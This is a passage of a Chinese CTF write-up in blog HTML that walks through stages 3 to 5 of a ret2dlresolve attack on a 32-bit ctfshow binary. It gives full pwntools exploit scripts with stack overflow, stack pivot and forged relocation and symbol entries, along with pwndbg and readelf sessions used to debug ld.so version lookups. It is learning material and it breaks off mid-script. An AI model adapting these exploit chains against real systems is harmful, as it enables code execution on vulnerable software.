class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line"></span><br><span class="line">rop.raw(write_got)  <span class="comment">#base_stage+24</span></span><br><span class="line">rop.raw(r_info)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line"></span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h4><p>在stage3中我们控制了重定位表项，但是伪造的重定位表项的内容仍然与write函数原来的重定位表项一致。</p>
<p>在这个阶段，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的<code>r_info=0x607</code>可以知道，write对应的符号在符号表的下标为 0x607&gt;&gt;8&#x3D;0x6。因此我们知道write对应的符号地址为0x0804822c。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">桌面$ readelf -x .dynsym pwn                  </span><br><span class="line"></span><br><span class="line">“.dynsym”节的十六进制输出：</span><br><span class="line">  0x080481cc 00000000 00000000 00000000 00000000 ................</span><br><span class="line">  0x080481dc 33000000 00000000 00000000 12000000 3...............</span><br><span class="line">  0x080481ec 27000000 00000000 00000000 12000000 <span class="string">&#x27;...............</span></span><br><span class="line"><span class="string">  0x080481fc 5c000000 00000000 00000000 20000000 \........... ...</span></span><br><span class="line"><span class="string">  0x0804820c 20000000 00000000 00000000 12000000  ...............</span></span><br><span class="line"><span class="string">  0x0804821c 3a000000 00000000 00000000 12000000 :...............</span></span><br><span class="line"><span class="string">  0x0804822c 4c000000 00000000 00000000 12000000 L...............</span></span><br><span class="line"><span class="string">  0x0804823c 1a000000 00000000 00000000 11000000 ................</span></span><br><span class="line"><span class="string">  0x0804824c 2c000000 00000000 00000000 11000000 ,...............</span></span><br><span class="line"><span class="string">  0x0804825c 0b000000 6c860408 04000000 11001000 ....l...........</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr<span class="comment">#0x80483c0</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#0x08048324</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">index_offset = (base_stage+<span class="number">24</span>) - rel_plt <span class="comment">#base_stage + 24指向fake_reloc</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line"><span class="built_in">print</span>(align)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align<span class="comment">#这里是为了对齐，因为dynsym里的Elf32_Sym结构体都是0x10字节大小的</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">r_info = (<span class="built_in">int</span>(index_dynsym) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#r_info的低8位要是7保证通过检查R_386_JUMP_SLOT=7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(r_info))</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">str_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(str_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line">rop.raw(fake_reloc)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*align)</span><br><span class="line">rop.raw(fake_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>执行之后发现程序断在了fixup函数里，也就是在<code>ld-linux.so.2</code>中崩了</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-28_20-50-10.png" alt="1"></p>
<p>接着跟着wiki分析</p>
<p>通过逆向分析ld-linux.so.2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v9 )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = (<span class="type">char</span> *)a1[<span class="number">92</span>] + <span class="number">16</span> * (*(_WORD *)(*((_DWORD *)v9 + <span class="number">1</span>) + <span class="number">2</span> * v4) &amp; <span class="number">0x7FFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_DWORD *)v10 + <span class="number">1</span>) )</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以及源码可以知道程序是在访问 version 的 hash 时出错</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">        (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进一步分析可以知道，因为我们伪造了 write 函数的重定位表项，其中 reloc-&gt;r_info（符号表索引+重定位类型） 被设置成了比较大的值（0x26807）（正常值是0x607）。这时候，ndx 的值并不可预期，进而 version 的值也不可预期，因此可能出现不可预期的情况。</p>
<p>通过分析 .dynmic 节，我们可以发现 vernum(VERSYM) 的地址为 0x80482d8。</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-28_21-26-06.png" alt="1"></p>
<p>在 ida 中，我们也可以看到相关的信息</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-28_21-34-24.png" alt="1"></p>
<blockquote>
<p>这一部分ndx的地址还没搞懂是怎么找的，先把wiki贴上</p>
<p>那我们可以再次运行看一下伪造后 ndx 具体的值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ python stage4.py</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./main_partial_relro_32&#x27;</span>: pid 27649</span><br><span class="line">[*] Loaded 10 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line">ndx_addr: 0x80487a8</span><br></pre></td></tr></table></figure>

<p>可以发现，ndx_落入了 <code>.eh_frame</code> 节中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eh_frame:080487A8                 db  2Ch ; ,</span><br></pre></td></tr></table></figure>

<p>进一步地，ndx 的值为 0x2C。显然不知道会索引到哪里去。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">        (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过动态调试，我们可以发现 l_versions 的起始地址，并且其中一共有 3 个元素。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *((struct link_map *)0xf7f0d940)</span><br><span class="line">$4 = &#123;</span><br><span class="line">  l_addr = 0, </span><br><span class="line">  l_name = 0xf7f0dc2c &quot;&quot;, </span><br><span class="line">  l_ld = 0x8049f0c, </span><br><span class="line">  l_next = 0xf7f0dc30, </span><br><span class="line">  l_prev = 0x0, </span><br><span class="line">  l_real = 0xf7f0d940, </span><br><span class="line">  l_ns = 0, </span><br><span class="line">  l_libname = 0xf7f0dc20, </span><br><span class="line">  l_info = &#123;0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 &lt;repeats 13 times&gt;, 0x8049fbc, 0x0 &lt;repeats 25 times&gt;, 0x8049f44&#125;, </span><br><span class="line">  l_phdr = 0x8048034, </span><br><span class="line">  l_entry = 134513632, </span><br><span class="line">  l_phnum = 9, </span><br><span class="line">  l_ldnum = 0, </span><br><span class="line">  l_searchlist = &#123;</span><br><span class="line">    r_list = 0xf7edf3e0, </span><br><span class="line">    r_nlist = 3</span><br><span class="line">  &#125;, </span><br><span class="line">  l_symbolic_searchlist = &#123;</span><br><span class="line">    r_list = 0xf7f0dc1c, </span><br><span class="line">    r_nlist = 0</span><br><span class="line">  &#125;, </span><br><span class="line">  l_loader = 0x0, </span><br><span class="line">  l_versions = 0xf7edf3f0, </span><br><span class="line">  l_nversions = 3, </span><br></pre></td></tr></table></figure>

<p>对应的分别为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *((struct r_found_version[3] *)0xf7edf3f0)</span><br><span class="line">$13 = &#123;&#123;</span><br><span class="line">    name = 0x0, </span><br><span class="line">    hash = 0, </span><br><span class="line">    hidden = 0, </span><br><span class="line">    filename = 0x0</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    name = 0x0, </span><br><span class="line">    hash = 0, </span><br><span class="line">    hidden = 0, </span><br><span class="line">    filename = 0x0</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    name = 0x80482be &quot;GLIBC_2.0&quot;, </span><br><span class="line">    hash = 225011984, </span><br><span class="line">    hidden = 0, </span><br><span class="line">    filename = 0x804826d &quot;libc.so.6&quot;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>此时，计算得到的 version 地址为 0xf7f236b0，显然不在映射的内存区域。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print /x 0xf7edf3f0+0x442C*16</span><br><span class="line">$16 = 0xf7f236b0</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32</span><br><span class="line">0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ec1000 0xf7ec4000 rw-p     3000 0      </span><br><span class="line">0xf7edf000 0xf7ee1000 rw-p     2000 0      </span><br><span class="line">0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]</span><br></pre></td></tr></table></figure>

<p>而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。</p>
<p>与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为 0。</p>
<p>那自然的，我们就可以调用目标函数。</p>
<p>这里，我们可以通过调整 base_stage 来达到相应的目的。</p>
<ul>
<li>首先 0x080487C2 与 0x080487A8 之间差了 0x080487C2-0x080487A8)&#x2F;2 个 version 记录。</li>
<li>那么，这也就说明原先的符号表偏移少了对应的个数。</li>
<li>因此，我们只需要将 base_stage 增加 (0x080487C2-0x080487A8)&#x2F;2*0x10，即可达到对应的目的。</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size + <span class="built_in">int</span>((<span class="number">0x080487C2</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>*<span class="number">0x10</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr<span class="comment">#0x80483c0</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#0x08048324</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">index_offset = (base_stage+<span class="number">24</span>) - rel_plt <span class="comment">#base_stage + 24指向fake_reloc</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line"><span class="built_in">print</span>(align)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align<span class="comment">#这里是为了对齐，因为dynsym里的Elf32_Sym结构体都是0x10字节大小的</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">r_info = (<span class="built_in">int</span>(index_dynsym) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#r_info的低8位要是7保证通过检查R_386_JUMP_SLOT=7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">str_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(str_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line">rop.raw(fake_reloc)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*align)</span><br><span class="line">rop.raw(fake_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>最终能正常输出</p>
<h4 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h4><p>这一阶段，我们将在4的基础上，进一步伪造write符号的st_name指向我们自己构造的字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span 